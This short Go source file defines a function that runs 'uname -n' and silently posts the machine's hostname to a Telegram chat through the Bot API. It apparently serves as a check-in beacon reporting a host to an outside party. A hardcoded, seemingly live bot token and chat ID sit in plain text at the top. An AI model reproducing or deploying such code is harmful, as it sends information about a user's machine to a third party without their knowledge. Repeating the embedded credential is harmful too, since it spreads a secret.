package main

import (
	"bytes"
	"encoding/json"
	"net/http"
        "fmt"
        "os/exec"
       "time"


)



var token string = "7975585705:AAEhpsmGaok-PDwktP3k83WDI-sF7OdS7o4"



func bot() {





      time.Sleep  (10  *  time.Second)  //evite    spam 



	cli := http.Client{}


        un := exec.Command("uname" , "-n")

        my_uname , err_combined := un.CombinedOutput()


        if err_combined != nil { return }


        uname := string(my_uname)




	str := map[string]string{

		"chat_id": "7127446120",
		"text":    uname ,
	}


	jm, _ := json.Marshal(str)

	data := bytes.NewBufferString(string(jm))

	req, _ := http.NewRequest("POST", "https://api.telegram.org/bot"+token+"/sendMessage", data)

	req.Header.Set("Content-Type", "application/json")

	r, _ := cli.Do(req)


  
       if  r.StatusCode  ==    200 { fmt.Println( " send ok"  ) }


}
